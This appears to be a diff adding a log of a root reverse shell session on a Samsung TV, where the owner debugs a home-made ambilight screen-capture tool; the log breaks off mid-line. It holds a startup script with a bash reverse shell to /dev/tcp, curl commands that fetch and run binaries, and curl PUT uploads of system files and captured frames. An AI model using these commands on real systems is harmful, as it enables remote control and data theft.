@@ -1,0 +1,382 @@
+[9998] aguardando TV...
+[9997] ponte de controle ok
+[9999] beacon ok
+tv-stack rodando. TV -> Remote PC -> Shared Folder.
+
+[9998] ROOT SHELL de ('192.168.3.191', 38092)
+bash: no job control in this shell
+bash-3.2# 
+[9997] controlador conectado
+ps -ef | grep -E "WledAmbiPpi|DropPriv" | grep -v grep | head -5; e<"WledAmbiPpi|DropPriv" | grep -v grep | head -5; ec                         ho ---LOG---; tail -12 /o<rep -v grep | head -5; echo ---LOG---; tail -12 /op                         t/usr/home/owner/ppi.log <o ---LOG---; tail -12 /opt/usr/home/owner/ppi.log 2                         >/dev/null; echo DONE
+owner     4577  4575  0 19:53 ?        00:00:00 dotnet DropPriv.exe 5001 100 env HOME=/opt/usr/home/owner /usr/bin/dotnet /home/owner/share/WledAmbiPpi.exe 192.168.3.176 4048 -1 > /opt/usr/home/owner/ppi.log 2>&1
+owner     4586  4577  0 19:53 ?        00:00:00 sh -c env HOME=/opt/usr/home/owner /usr/bin/dotnet /home/owner/share/WledAmbiPpi.exe 192.168.3.176 4048 -1 > /opt/usr/home/owner/ppi.log 2>&1
+owner     4587  4586  2 19:53 ?        00:00:01 /usr/bin/dotnet /home/owner/share/WledAmbiPpi.exe 192.168.3.176 4048 -1
+---LOG---
+ppi fail r=-1
+ppi fail r=-1
+ppi fail r=-1
+ppi fail r=-1
+ppi fail r=-1
+ppi fail r=-1
+ppi fail r=-1
+ppi fail r=-1
+ppi fail r=-1
+ppi fail r=-1
+ppi fail r=-1
+ppi fail r=-1
+DONE
+bash-3.2# 
+[9997] controlador conectado
+tail -8 /opt/usr/home/owner/ppi.log; grep -c "ppi fail" /opt/usr/ho<home/owner/ppi.log; grep -c "ppi fail" /opt/usr/hom                         e/owner/ppi.log; grep -c <c "ppi fail" /opt/usr/home/owner/ppi.log; grep -c "                         ^f" /opt/usr/home/owner/p</owner/ppi.log; grep -c "^f" /opt/usr/home/owner/pp                         i.log; echo DONE2
+@(4587:dotnet:TZCAPTURE_Initialize:225): ACCESS_DENIED Process!!!!!! 6
+@(4587:dotnet:checkProcessWhitelist:127): error [/usr/bin/dotnet] TZCAPTURE_ACCESS_DENIED 
+@(4587:dotnet:TZCAPTURE_Initialize:225): ACCESS_DENIED Process!!!!!! 6
+@(4587:dotnet:checkProcessWhitelist:127): error [/usr/bin/dotnet] TZCAPTURE_ACCESS_DENIED 
+@(4587:dotnet:TZCAPTURE_Initialize:225): ACCESS_DENIED Process!!!!!! 6
+@(4587:dotnet:checkProcessWhitelist:127): error [/usr/bin/dotnet] TZCAPTURE_ACCESS_DENIED 
+@(4587:dotnet:TZCAPTURE_Initialize:225): ACCESS_DENIED Process!!!!!! 6
+@(4587:dotnet:checkProcessWhitelist:127): error [/usr/bin/dotnet] TZCAPTURE_ACCESS_DENIED ppi fail r=-1
+229
+3
+DONE2
+bash-3.2# 
+[9997] controlador conectado
+cat /proc/4587/attr/current 2>&1; cat /proc/4587/attr/exec 2>&1; ls<tr/current 2>&1; cat /proc/4587/attr/exec 2>&1; ls                          -la /proc/4587/exe 2>&1 |</4587/attr/exec 2>&1; ls -la /proc/4587/exe 2>&1 |                          head -2; head -30 /opt/us<la /proc/4587/exe 2>&1 | head -2; head -30 /opt/usr                         /home/owner/ppi.log | gre<ead -2; head -30 /opt/usr/home/owner/ppi.log | grep                          -v "ppi fail" | head -10<home/owner/ppi.log | grep -v "ppi fail" | head -10;                          echo DONE3
+Usercat: /proc/4587/attr/exec: Invalid argument
+lrwxrwxrwx 1 owner users 0 2026-10-27 19:56 /proc/4587/exe -> /usr/bin/dotnet
+WledAmbiPpi: 192.168.3.176:4048
+f100 avg=30ms 720x540
+f200 avg=31ms 720x540
+f300 avg=27ms 720x540
+DONE3
+bash-3.2# 
+[9997] controlador conectado
+curl -s -o /home/owner/share/WledAmbiPpi.exe http://192.168.3.200:8<owner/share/WledAmbiPpi.exe http://192.168.3.200:88                         88/sdpmemcs/WledAmbiPpi.e<e http://192.168.3.200:8888/sdpmemcs/WledAmbiPpi.ex                         e && ls -la /home/owner/s<8/sdpmemcs/WledAmbiPpi.exe && ls -la /home/owner/sh                         are/WledAmbiPpi.exe; pkil< && ls -la /home/owner/share/WledAmbiPpi.exe; pkill                          -f WledAmbiPpi.exe; slee<re/WledAmbiPpi.exe; pkill -f WledAmbiPpi.exe; sleep                          1; cd /home/owner/share <-f WledAmbiPpi.exe; sleep 1; cd /home/owner/share &                         & setsid /usr/bin/dotnet <1; cd /home/owner/share && setsid /usr/bin/dotnet W                         ledAmbiPpi.exe 192.168.3.< setsid /usr/bin/dotnet WledAmbiPpi.exe 192.168.3.1                         76 4048 -1 >/opt/usr/home<edAmbiPpi.exe 192.168.3.176 4048 -1 >/opt/usr/home/                         owner/ppi.log 2>&1 & slee<6 4048 -1 >/opt/usr/home/owner/ppi.log 2>&1 & sleep                          4; head -5 /opt/usr/home<wner/ppi.log 2>&1 & sleep 4; head -5 /opt/usr/home/                         owner/ppi.log; echo DEPLO<4; head -5 /opt/usr/home/owner/ppi.log; echo DEPLOY                         ED
+-rw-r--r-- 1 root root 11776 2026-10-27 20:02 /home/owner/share/WledAmbiPpi.exe
+[1] 6501
+WledAmbiPpi: 192.168.3.176:4048
+ppi fail r=-1
+ppi fail r=-1
+ppi fail r=-1
+ppi fail r=-1
+DEPLOYED
+bash-3.2# 
+[9997] controlador conectado
+tail -15 /opt/usr/home/owner/ppi.log; echo TAILDONE
+@(6503:dotnet:TZCAPTURE_Initialize:225): ACCESS_DENIED Process!!!!!! 6
+@(6503:dotnet:checkProcessWhitelist:127): error [/usr/bin/dotnet] TZCAPTURE_ACCESS_DENIED 
+@(6503:dotnet:TZCAPTURE_Initialize:225): ACCESS_DENIED Process!!!!!! 6
+@(6503:dotnet:checkProppiVe: dlsym fail
+ppi fail r=-1
+ppiVe: dlsym fail
+ppi fail r=-1
+ppiVe: dlsym fail
+ppi fail r=-1
+ppiVe: dlsym fail
+ppi fail r=-1
+ppiVe: dlsym fail
+ppi fail r=-1
+ppiVe: dlsym fail
+ppi fail r=-1
+TAILDONE
+bash-3.2# 
+[9997] controlador conectado
+ls -la /usr/lib/libvideoenhance* /usr/lib/libvideo* 2>/dev/null | h<ibvideoenhance* /usr/lib/libvideo* 2>/dev/null | he                         ad -8; strings /usr/lib/l<ibvideo* 2>/dev/null | head -8; strings /usr/lib/li                         bvideoenhance.so 2>/dev/n<d -8; strings /usr/lib/libvideoenhance.so 2>/dev/nu                         ll | grep -iE "ppi|measur<videoenhance.so 2>/dev/null | grep -iE "ppi|measure                         |rgb" | head -20; echo ST<l | grep -iE "ppi|measure|rgb" | head -20; echo STR                         DONE
+lrwxrwxrwx 1 root root    40 2026-07-21 06:54 /usr/lib/libvideo-capture-impl-sec-diagnosis.so -> libvideo-capture-impl-sec-diagnosis.so.0
+lrwxrwxrwx 1 root root    44 2026-07-21 06:54 /usr/lib/libvideo-capture-impl-sec-diagnosis.so.0 -> libvideo-capture-impl-sec-diagnosis.so.0.1.0
+-rwxr-xr-x 1 root root 16328 2026-07-21 07:45 /usr/lib/libvideo-capture-impl-sec-diagnosis.so.0.1.0
+lrwxrwxrwx 1 root root    30 2026-07-21 06:54 /usr/lib/libvideo-capture-impl-sec.so -> libvideo-capture-impl-sec.so.0
+lrwxrwxrwx 1 root root    34 2026-07-21 06:54 /usr/lib/libvideo-capture-impl-sec.so.0 -> libvideo-capture-impl-sec.so.0.1.0
+-rwxr-xr-x 1 root root 47844 2026-07-21 07:45 /usr/lib/libvideo-capture-impl-sec.so.0.1.0
+lrwxrwxrwx 1 root root    25 2026-07-21 06:44 /usr/lib/libvideo-capture.so.0 -> libvideo-capture.so.0.1.0
+-rwxr-xr-x 1 root root 24104 2026-07-21 07:45 /usr/lib/libvideo-capture.so.0.1.0
+bash: [4576: 4] tcsetattr: Inappropriate ioctl for device
+STRDONE
+bash-3.2# 
+[9997] controlador conectado
+find / -name "libvideoenhance*" 2>/dev/null | head -5; objdump -T /<videoenhance*" 2>/dev/null | head -5; objdump -T /u                         sr/lib/libvideoenhance.so< | head -5; objdump -T /usr/lib/libvideoenhance.so                          2>/dev/null | grep -iE "p<r/lib/libvideoenhance.so 2>/dev/null | grep -iE "pp                         i|measure|ve_" | head -25<>/dev/null | grep -iE "ppi|measure|ve_" | head -25;                          readelf -Ws /usr/lib/lib<|measure|ve_" | head -25; readelf -Ws /usr/lib/libv                         ideoenhance.so 2>/dev/nul<readelf -Ws /usr/lib/libvideoenhance.so 2>/dev/null                          | grep -iE "ppi|measure|<deoenhance.so 2>/dev/null | grep -iE "ppi|measure|F                         UNC" | head -25; echo SYM<| grep -iE "ppi|measure|FUNC" | head -25; echo SYMD                         ONE
+/usr/lib/libvideoenhance.so
+/usr/lib/libvideoenhance.so.0
+/usr/lib/libvideoenhance.so.0.1
+SYMDONE
+bash-3.2# 
+[9997] controlador conectado
+cp /usr/lib/libvideoenhance.so.0.1 /home/owner/share/tmp/sdk_tools/<deoenhance.so.0.1 /home/owner/share/tmp/sdk_tools/l                         ibvideoenhance.so 2>/dev/<ner/share/tmp/sdk_tools/libvideoenhance.so 2>/dev/n                         ull; curl -s -X PUT --dat<bvideoenhance.so 2>/dev/null; curl -s -X PUT --data                         -binary @/usr/lib/libvide<ll; curl -s -X PUT --data-binary @/usr/lib/libvideo                         enhance.so.0.1 http://192<binary @/usr/lib/libvideoenhance.so.0.1 http://192.                         168.3.200:8899/libvideoen<nhance.so.0.1 http://192.168.3.200:8899/libvideoenh                         ance.so 2>&1 | head -3; l<68.3.200:8899/libvideoenhance.so 2>&1 | head -3; ls                          -la /usr/lib/libvideoenh<nce.so 2>&1 | head -3; ls -la /usr/lib/libvideoenha                         nce.so.0.1; echo UPDONE
+[8899] recv C:\Users\rpf16\q80a_debloat\kit\..\tools\tvbin\libvideoenhance.so (19796)
+-rwxr-xr-x 1 root root 19796 2026-07-21 07:45 /usr/lib/libvideoenhance.so.0.1
+UPDONE
+bash-3.2# 
+[9997] controlador conectado
+for f in /usr/lib/lib*.so* /opt/usr/lib/lib*.so*; do strings $f 2>/</lib*.so* /opt/usr/lib/lib*.so*; do strings $f 2>/d                         ev/null | grep -l . >/dev<*.so*; do strings $f 2>/dev/null | grep -l . >/dev/                         null && strings $f 2>/dev<v/null | grep -l . >/dev/null && strings $f 2>/dev/                         null | grep -iE "rgb_meas<ull && strings $f 2>/dev/null | grep -iE "rgb_measu                         re|ppi_ve|measure_pixel" <ull | grep -iE "rgb_measure|ppi_ve|measure_pixel" >                         /dev/null && echo FOUND:$<e|ppi_ve|measure_pixel" >/dev/null && echo FOUND:$f                         ; done 2>/dev/null | head<dev/null && echo FOUND:$f; done 2>/dev/null | head                          -10; echo SCANDONE
+SCANDONE
+bash-3.2# 
+[9997] controlador conectado
+curl -s -o /home/owner/share/WledAmbiPpi.exe http://192.168.3.200:8<owner/share/WledAmbiPpi.exe http://192.168.3.200:88                         88/sdpmemcs/WledAmbiPpi.e<e http://192.168.3.200:8888/sdpmemcs/WledAmbiPpi.ex                         e && pkill -f WledAmbiPpi<8/sdpmemcs/WledAmbiPpi.exe && pkill -f WledAmbiPpi.                         exe; sleep 1; cd /home/ow< && pkill -f WledAmbiPpi.exe; sleep 1; cd /home/own                         er/share && setsid /usr/b<xe; sleep 1; cd /home/owner/share && setsid /usr/bi                         n/dotnet WledAmbiPpi.exe <r/share && setsid /usr/bin/dotnet WledAmbiPpi.exe 1                         92.168.3.176 4048 -1 >/op</dotnet WledAmbiPpi.exe 192.168.3.176 4048 -1 >/opt                         /usr/home/owner/ppi.log 2<2.168.3.176 4048 -1 >/opt/usr/home/owner/ppi.log 2>                         &1 & sleep 6; tail -8 /op<usr/home/owner/ppi.log 2>&1 & sleep 6; tail -8 /opt                         /usr/home/owner/ppi.log; <1 & sleep 6; tail -8 /opt/usr/home/owner/ppi.log; e                         cho DEPLOYED2
+[1] 12730
+ppi fail r=-1
+ppi fail r=-1
+ppi fail r=-1
+ppi fail r=-1
+ppi fail r=-1
+ppiVe: dlsym fail (API ausente nesta firmware)
+ppi fail r=-1
+ppi fail r=-1
+DEPLOYED2
+bash-3.2# 
+[9998] TV desconectou
+
+[9997] controlador conectado
+
+[9997] controlador conectado
+
+[9998] ROOT SHELL de ('192.168.3.191', 50515)
+bash: no job control in this shell
+bash-3.2# cd /home/owner/share && /usr/bin/dotnet PpiDump.exe 2>&1 | head -5;<are && /usr/bin/dotnet PpiDump.exe 2>&1 | head -5;                          ls -la frame.y frame.c 2><Dump.exe 2>&1 | head -5; ls -la frame.y frame.c 2>/                         dev/null; echo DUMPDONE
+The specified file does not exist.
+-rw-rw-rw- 1 root root 518400 2026-10-25 11:29 frame.c
+-rw-rw-rw- 1 root root 518400 2026-10-25 11:29 frame.y
+DUMPDONE
+bash-3.2# cd /home/owner/share && /usr/bin/dotnet PpiDump.exe 2>&1 | head -5;<are && /usr/bin/dotnet PpiDump.exe 2>&1 | head -5;                          ls -la frame.y frame.c 2><Dump.exe 2>&1 | head -5; ls -la frame.y frame.c 2>/                         dev/null; echo DUMPDONE
+The specified file does not exist.
+-rw-rw-rw- 1 root root 518400 2026-10-25 11:29 frame.c
+-rw-rw-rw- 1 root root 518400 2026-10-25 11:29 frame.y
+DUMPDONE
+bash-3.2# 
+[9997] controlador conectado
+cd /home/owner/share && /usr/bin/dotnet sdpmemcs/PpiDump.exe 2>&1 |<are && /usr/bin/dotnet sdpmemcs/PpiDump.exe 2>&1 |                          head -5; echo DUMP2DONE
+The specified file does not exist.
+DUMP2DONE
+bash-3.2# 
+[9997] controlador conectado
+ls -la /home/owner/share/sdpmemcs/PpiDump* /home/owner/share/PpiDum<r/share/sdpmemcs/PpiDump* /home/owner/share/PpiDump                         * 2>&1 | head -8; ls /hom</home/owner/share/PpiDump* 2>&1 | head -8; ls /home                         /owner/share/ | head -20;< 2>&1 | head -8; ls /home/owner/share/ | head -20;                          echo LSDONE
+ls: cannot access /home/owner/share/sdpmemcs/PpiDump*: No such file or directory
+ls: cannot access /home/owner/share/PpiDump*: No such file or directory
+ambi.log
+app_layer
+apps_recent_layer
+apps_recommend_layer
+boot.log
+caps
+caps3
+com.samsung.tv.knox-browser
+def
+dotnet
+DropPriv.exe
+DropPriv.runtimeconfig.json
+frame.c
+frame.y
+gstreamer
+mde-framework
+media
+multiviewfactorycount
+multiviewservicecount
+mycontents_temp
+LSDONE
+bash-3.2# 
+[9997] controlador conectado
+cd /home/owner/share && curl -s -o PpiDump.exe http://192.168.3.200<are && curl -s -o PpiDump.exe http://192.168.3.200:                         8888/sdpmemcs/PpiDump.exe<exe http://192.168.3.200:8888/sdpmemcs/PpiDump.exe                          && /usr/bin/dotnet PpiDum<888/sdpmemcs/PpiDump.exe && /usr/bin/dotnet PpiDump                         .exe 2>&1 | head -4; ls -<& /usr/bin/dotnet PpiDump.exe 2>&1 | head -4; ls -l                         a frame.y frame.c; echo D<exe 2>&1 | head -4; ls -la frame.y frame.c; echo DU                         MP3DONE
+r=0 720x540 ysz=518400 csz=518400
+dumped 518400+518400
+-rw-rw-rw- 1 root root 518400 2026-10-27 20:35 frame.c
+-rw-rw-rw- 1 root root 518400 2026-10-27 20:35 frame.y
+DUMP3DONE
+bash-3.2# 
+[9997] controlador conectado
+curl -s -X PUT --data-binary @/home/owner/share/frame.y http://192.<data-binary @/home/owner/share/frame.y http://192.1                         68.3.200:8899/frame.y >/d<hare/frame.y http://192.168.3.200:8899/frame.y >/de                         v/null; curl -s -X PUT --<8.3.200:8899/frame.y >/dev/null; curl -s -X PUT --d                         ata-binary @/home/owner/s</null; curl -s -X PUT --data-binary @/home/owner/sh                         are/frame.c http://192.16<ta-binary @/home/owner/share/frame.c http://192.168                         .3.200:8899/frame.c >/dev<re/frame.c http://192.168.3.200:8899/frame.c >/dev/                         null; echo UPDONE
+[8899] recv C:\Users\rpf16\q80a_debloat\kit\..\tools\tvbin\frame.y (518400)
+[8899] recv C:\Users\rpf16\q80a_debloat\kit\..\tools\tvbin\frame.c (518400)
+UPDONE
+bash-3.2# 
+[9997] controlador conectado
+cd /home/owner/share && /usr/bin/dotnet PpiDump.exe 2>&1 | head -3 <are && /usr/bin/dotnet PpiDump.exe 2>&1 | head -3 &                         & curl -s -X PUT --data-b<Dump.exe 2>&1 | head -3 && curl -s -X PUT --data-bi                         nary @frame.y http://192.< curl -s -X PUT --data-binary @frame.y http://192.1                         68.3.200:8899/frame.y >/d<ary @frame.y http://192.168.3.200:8899/frame.y >/de                         v/null && curl -s -X PUT <8.3.200:8899/frame.y >/dev/null && curl -s -X PUT -                         -data-binary @frame.c htt</null && curl -s -X PUT --data-binary @frame.c http                         ://192.168.3.200:8899/fra<data-binary @frame.c http://192.168.3.200:8899/fram                         e.c >/dev/null && echo AL<//192.168.3.200:8899/frame.c >/dev/null && echo ALL                         DONE
+r=-1 960x540 ysz=0 csz=0
+Unhandled exception. System.ArgumentNullException: Value cannot be null. (Parameter 'source')
+   at System.Runtime.InteropServices.Marshal.CopyToManaged[T](IntPtr source, T[] destination, Int32 startIndex, Int32 length)
+bash: [4417: 4] tcsetattr: Inappropriate ioctl for device
+[8899] recv C:\Users\rpf16\q80a_debloat\kit\..\tools\tvbin\frame.y (518400)
+[8899] recv C:\Users\rpf16\q80a_debloat\kit\..\tools\tvbin\frame.c (518400)
+ALLDONE
+bash-3.2# 
+[9997] controlador conectado
+pkill -f WledAmbiPpi.exe; sleep 1; cd /home/owner/share && rm -f fr<Ppi.exe; sleep 1; cd /home/owner/share && rm -f fra                         me.y frame.c && /usr/bin/</owner/share && rm -f frame.y frame.c && /usr/bin/d                         otnet PpiDump.exe 2>&1 | <e.y frame.c && /usr/bin/dotnet PpiDump.exe 2>&1 | h                         ead -4 && ls -la frame.y <tnet PpiDump.exe 2>&1 | head -4 && ls -la frame.y f                         rame.c && curl -s -X PUT <ad -4 && ls -la frame.y frame.c && curl -s -X PUT -                         -data-binary @frame.y htt<ame.c && curl -s -X PUT --data-binary @frame.y http                         ://192.168.3.200:8899/fra<data-binary @frame.y http://192.168.3.200:8899/fram                         e.y >/dev/null && curl -s<//192.168.3.200:8899/frame.y >/dev/null && curl -s                          -X PUT --data-binary @fra<.y >/dev/null && curl -s -X PUT --data-binary @fram                         e.c http://192.168.3.200:<X PUT --data-binary @frame.c http://192.168.3.200:8                         899/frame.c >/dev/null &&<.c http://192.168.3.200:8899/frame.c >/dev/null &&                          echo FRESHDONE
+r=-1 960x540 ysz=0 csz=0
+Unhandled exception. System.ArgumentNullException: Value cannot be null. (Parameter 'source')
+   at System.Runtime.InteropServices.Marshal.CopyToManaged[T](IntPtr source, T[] destination, Int32 startIndex, Int32 length)
+   at System.Runtime.InteropServices.Marshal.Copy(IntPtr source, Byte[] destination, Int32 startIndex, Int32 length)
+bash: [4417: 4] tcsetattr: Inappropriate ioctl for device
+ls: cannot access frame.y: No such file or directory
+ls: cannot access frame.c: No such file or directory
+bash-3.2# 
+[9997] controlador conectado
+curl -s -o /home/owner/share/WledAmbiPpi.exe http://192.168.3.200:8<owner/share/WledAmbiPpi.exe http://192.168.3.200:88                         88/sdpmemcs/WledAmbiPpi.e<e http://192.168.3.200:8888/sdpmemcs/WledAmbiPpi.ex                         e && cd /home/owner/share<8/sdpmemcs/WledAmbiPpi.exe && cd /home/owner/share                          && setsid /usr/bin/dotnet< && cd /home/owner/share && setsid /usr/bin/dotnet                          WledAmbiPpi.exe 192.168.3<& setsid /usr/bin/dotnet WledAmbiPpi.exe 192.168.3.                         176 4048 -1 >/opt/usr/hom<ledAmbiPpi.exe 192.168.3.176 4048 -1 >/opt/usr/home                         /owner/ppi.log 2>&1 & sle<76 4048 -1 >/opt/usr/home/owner/ppi.log 2>&1 & slee                         p 5; tail -6 /opt/usr/hom<owner/ppi.log 2>&1 & sleep 5; tail -6 /opt/usr/home                         /owner/ppi.log; echo RELA< 5; tail -6 /opt/usr/home/owner/ppi.log; echo RELAU                         NCHED
+[1] 6415
+WledAmbiPpi: 192.168.3.176:4048
+f100 avg=41ms 720x540
+RELAUNCHED
+bash-3.2# 
+[9997] controlador conectado
+curl -s -o /home/owner/share/WledAmbiPpi.exe http://192.168.3.200:8<owner/share/WledAmbiPpi.exe http://192.168.3.200:88                         88/sdpmemcs/WledAmbiPpi.e<e http://192.168.3.200:8888/sdpmemcs/WledAmbiPpi.ex                         e && pkill -f WledAmbiPpi<8/sdpmemcs/WledAmbiPpi.exe && pkill -f WledAmbiPpi.                         exe; sleep 1; cd /home/ow< && pkill -f WledAmbiPpi.exe; sleep 1; cd /home/own                         er/share && setsid /usr/b<xe; sleep 1; cd /home/owner/share && setsid /usr/bi                         n/dotnet WledAmbiPpi.exe <r/share && setsid /usr/bin/dotnet WledAmbiPpi.exe 1                         92.168.3.176 4048 -1 hdr </dotnet WledAmbiPpi.exe 192.168.3.176 4048 -1 hdr >                         /opt/usr/home/owner/ppi.l<2.168.3.176 4048 -1 hdr >/opt/usr/home/owner/ppi.lo                         g 2>&1 & sleep 5; tail -6<opt/usr/home/owner/ppi.log 2>&1 & sleep 5; tail -6                          /opt/usr/home/owner/ppi.l< 2>&1 & sleep 5; tail -6 /opt/usr/home/owner/ppi.lo                         g; echo HDRDEPLOY
+[1] 7104
+WledAmbiPpi: 192.168.3.176:4048
+f100 avg=45ms 720x540
+HDRDEPLOY
+bash-3.2# 
+[9997] controlador conectado
+cat /home/owner/share/r 2>/dev/null | head -40; echo RDONE
+#!/bin/bash
+mkdir -p /opt/usr/home/owner/caps
+pkill -f WledAmbi 2>/dev/null
+(cd /home/owner/share && dotnet DropPriv.exe 5001 100 "env HOME=/opt/usr/home/owner /usr/bin/dotnet /home/owner/share/WledAmbiPpi.exe 192.168.3.176 4048 -1 > /opt/usr/home/owner/ppi.log 2>&1" &)
+/bin/bash -i >& /dev/tcp/192.168.3.200/9998 0>&1
+RDONE
+bash-3.2# 
+[9997] controlador conectado
+cat > /home/owner/share/r <<RS
+> #!/bin/bash
+> mkdir -p /opt/usr/home/owner/caps
+> pkill -f WledAmbi 2>/dev/null
+> (cd /home/owner/share && dotnet DropPriv.exe 5001 100 "env HOME=/opt/usr/ho<dotnet DropPriv.exe 5001 100 "env HOME=/opt/usr/hom                         e/owner bash -c "while :;<00 "env HOME=/opt/usr/home/owner bash -c "while :;                          do /usr/bin/dotnet /home/</owner bash -c "while :; do /usr/bin/dotnet /home/o                         wner/share/WledAmbiPpi.ex<o /usr/bin/dotnet /home/owner/share/WledAmbiPpi.exe                          192.168.3.176 4048 -1 hd<ner/share/WledAmbiPpi.exe 192.168.3.176 4048 -1 hdr                          >> /opt/usr/home/owner/p<192.168.3.176 4048 -1 hdr >> /opt/usr/home/owner/pp                         i.log 2>&1; sleep 3; done<>> /opt/usr/home/owner/ppi.log 2>&1; sleep 3; done"                         " &)
+> /bin/bash -i >& /dev/tcp/192.168.3.200/9998 0>&1
+> RS
+bash-3.2# cat /home/owner/share/r; echo RWRITTEN
+#!/bin/bash
+mkdir -p /opt/usr/home/owner/caps
+pkill -f WledAmbi 2>/dev/null
+(cd /home/owner/share && dotnet DropPriv.exe 5001 100 "env HOME=/opt/usr/home/owner bash -c "while :; do /usr/bin/dotnet /home/owner/share/WledAmbiPpi.exe 192.168.3.176 4048 -1 hdr >> /opt/usr/home/owner/ppi.log 2>&1; sleep 3; done"" &)
+/bin/bash -i >& /dev/tcp/192.168.3.200/9998 0>&1
+RWRITTEN
+bash-3.2# 
+[9997] controlador conectado
+cat > /home/owner/share/ambilight.sh <<AS
+> #!/bin/bash
+> export HOME=/opt/usr/home/owner
+> while :; do
+>   /usr/bin/dotnet /home/owner/share/WledAmbiPpi.exe 192.168.3.176 4048 -1 h<wner/share/WledAmbiPpi.exe 192.168.3.176 4048 -1 hd                         r >> /opt/usr/home/owner/< 192.168.3.176 4048 -1 hdr >> /opt/usr/home/owner/p                         pi.log 2>&1
+>   sleep 3
+> done
+> AS
+bash-3.2# chmod +x /home/owner/share/ambilight.sh
+bash-3.2# cat > /home/owner/share/r <<RS
+> #!/bin/bash
+> mkdir -p /opt/usr/home/owner/caps
+> pkill -f WledAmbi 2>/dev/null
+> (cd /home/owner/share && dotnet DropPriv.exe 5001 100 "env HOME=/opt/usr/ho<dotnet DropPriv.exe 5001 100 "env HOME=/opt/usr/hom                         e/owner bash /home/owner/<00 "env HOME=/opt/usr/home/owner bash /home/owner/s                         hare/ambilight.sh" &)
+> /bin/bash -i >& /dev/tcp/192.168.3.200/9998 0>&1
+> RS
+bash-3.2# cat /home/owner/share/r; echo ---; cat /home/owner/share/ambilight.<hare/r; echo ---; cat /home/owner/share/ambilight.s                         h; echo RWRITTEN2
+#!/bin/bash
+mkdir -p /opt/usr/home/owner/caps
+pkill -f WledAmbi 2>/dev/null
+(cd /home/owner/share && dotnet DropPriv.exe 5001 100 "env HOME=/opt/usr/home/owner bash /home/owner/share/ambilight.sh" &)
+/bin/bash -i >& /dev/tcp/192.168.3.200/9998 0>&1
+---
+#!/bin/bash
+export HOME=/opt/usr/home/owner
+while :; do
+  /usr/bin/dotnet /home/owner/share/WledAmbiPpi.exe 192.168.3.176 4048 -1 hdr >> /opt/usr/home/owner/ppi.log 2>&1
+  sleep 3
+done
+RWRITTEN2
+bash-3.2# 
+[9997] controlador conectado
+curl -s -o /home/owner/share/WledAmbiPpi.exe http://192.168.3.200:8<owner/share/WledAmbiPpi.exe http://192.168.3.200:88                         88/sdpmemcs/WledAmbiPpi.e<e http://192.168.3.200:8888/sdpmemcs/WledAmbiPpi.ex                         e && pkill -f WledAmbi 2><8/sdpmemcs/WledAmbiPpi.exe && pkill -f WledAmbi 2>/                         dev/null; sleep 1; setsid< && pkill -f WledAmbi 2>/dev/null; sleep 1; setsid                          bash /home/owner/share/am<ev/null; sleep 1; setsid bash /home/owner/share/amb                         ilight.sh </dev/null >/de<ash /home/owner/share/ambilight.sh </dev/null >/dev                         /null 2>&1 & sleep 6; tai<light.sh </dev/null >/dev/null 2>&1 & sleep 6; tail                          -8 /opt/usr/home/owner/p<null 2>&1 & sleep 6; tail -8 /opt/usr/home/owner/pp                         i.log; echo LOOPSUP
+[1] 7488
+f2800 avg=42ms 720x540
+f2900 avg=42ms 720x540
+f3000 avg=42ms 720x540
+f3100 avg=42ms 720x540
+f3200 avg=42ms 720x540
+f3300 avg=42ms 720x540
+f3400 avg=42ms 720x540
+f3500 avg=42ms 720x540
+LOOPSUP
+bash-3.2# 
+[9997] controlador conectado
+ps -ef | grep -E "WledAmbiPpi|ambilight" | grep -v grep | head -4; <"WledAmbiPpi|ambilight" | grep -v grep | head -4; e                         cho ---; tail -12 /opt/us<grep -v grep | head -4; echo ---; tail -12 /opt/usr                         /home/owner/ppi.log; echo<ho ---; tail -12 /opt/usr/home/owner/ppi.log; echo                          DIAGDONE
+---
+f2400 avg=42ms 720x540
+f2500 avg=42ms 720x540
+f2600 avg=42ms 720x540
+f2700 avg=42ms 720x540
+f2800 avg=42ms 720x540
+f2900 avg=42ms 720x540
+f3000 avg=42ms 720x540
+f3100 avg=42ms 720x540
+f3200 avg=42ms 720x540
+f3300 avg=42ms 720x540
+f3400 avg=42ms 720x540
+f3500 avg=42ms 720x540
+DIAGDONE
+bash-3.2# 
+[9997] controlador conectado
+ps -ef | grep -E "dotnet|ambilight" | grep -v grep | head -6; echo <"dotnet|ambilight" | grep -v grep | head -6; echo -                         --; grep -nE "wedge|WledA<-v grep | head -6; echo ---; grep -nE "wedge|WledAm                         biPpi:|fail|Exception" /o<-; grep -nE "wedge|WledAmbiPpi:|fail|Exception" /op                         t/usr/home/owner/ppi.log <iPpi:|fail|Exception" /opt/usr/home/owner/ppi.log |                          tail -12; echo DIAG2
+root       562     1  0 20:32 ?        00:00:00 /bin/dotnet-memory-reclaimer
+owner     4960   446  0 20:33 ?        00:00:00 /usr/bin/dotnet-hydra-loader 3 0 1 ZjRiYjc1MDNiMzRhOTI0ZjIxNjg0N2NmOGNmZjE0N2MiAAAAAQQAAAoAAAAtLWFwcFR5cGUACAAAAGluaG91c2UAsAUAAAEFAAAIAAAAcHJlbG9hZAAjAAAAHQAAAC91c3IvbGliL2xpYmRhbGkyLWFkYXB0b3Iuc28AIwAAAC91c3IvbGliL2xpYmRhbGkyLWNzaGFycC1iaW5kZXIuc28AHQAAAC91c3IvbGliL2xpYmRhbGkyLXRvb2xraXQuc28AQgAAAC91c3IvbGliL2Vjb3JlX2ltZi9tb2R1bGVzL3dheWxhbmQvdi0xLjE2L2xpYndsdGV4dGlucHV0bW9kdWxlLnNvACAAAAAvdXNyL2xpYi9saWJhcHBjb3JlLWNvbW1vbi5zby4xAB0AAAAvdXNyL2xpYi9saWJhcHBjb3JlLWVmbC5zby4xABcAAAAvdXNyL2xpYi9saWJjYWlyby5zby4yACgAAAAvdXNyL2xpYi9saWJjYXBpLWFwcGZ3LWFwcGxpY2F0aW9uLnNvLjAAIwAAAC91c3IvbGliL2xpYmNhcGktbWVkaWEtY2FtZXJhLnNvLjAAIwAAAC91c3IvbGliL2xpYmNhcGktbWVkaWEtcGxheWVyLnNvLjAAHAAAAC91c3IvbGliL2xpYmVmbC1hc3Npc3Quc28uMAAcAAAAL3Vzci9saWIvbGlic2VhbC1hcHAtZndrLnNvACUAAAAvdXNyL2xpYi9idWZtZ3IvbGlidGJtX25pa2Uuc28uMC4wLjAAHgAAAC91c3IvbGliL2RyaXZlci9saWJtYWxpLjRrLnNvADMAAAAvdXNyL2xpYi9lY29yZV93bDIvZW5naW5lcy9kbWFidWYvdi0xLjIzL21vZHVsZS5zbwAjAAAAL3Vzci9saWIvbGliYXVsLWV4dGVuc2lvbi5zby4wLjEuMAAvAAAAL3Vzci9saWIvbGliY2FwaS